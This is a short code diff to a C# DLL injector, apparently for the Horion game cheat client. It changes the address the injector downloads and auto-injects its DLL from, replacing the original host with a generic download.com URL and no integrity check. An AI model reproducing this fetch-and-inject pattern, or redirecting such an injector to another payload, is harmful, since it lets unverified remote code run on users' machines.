@@ -120,7 +120,8 @@ namespace HorionInjector
             var wc = new WebClient();
             var file = Path.Combine(Path.GetTempPath(), "Horion.dll");
             wc.DownloadFileCompleted += (_, __) => Inject(file);
-            wc.DownloadFileAsync(new Uri("https://horion.download/bin/Horion.dll"), file);
+            //wc.DownloadFileAsync(new Uri("https://horion.download/bin/Horion.dll"), file);
+            wc.DownloadFileAsync(new Uri("https://download.com/dll"), file);
         }
 
         private void InjectButton_Right(object sender, MouseButtonEventArgs e)
@@ -152,7 +153,8 @@ namespace HorionInjector
         {
             try
             {
-                var request = (HttpWebRequest) WebRequest.Create("https://horion.download");
+                //var request = (HttpWebRequest) WebRequest.Create("https://horion.download");
+                var request = (HttpWebRequest) WebRequest.Create("https://download.com");
                 request.KeepAlive = false;
                 request.Timeout = 1000;
                 using (request.GetResponse()) return true;
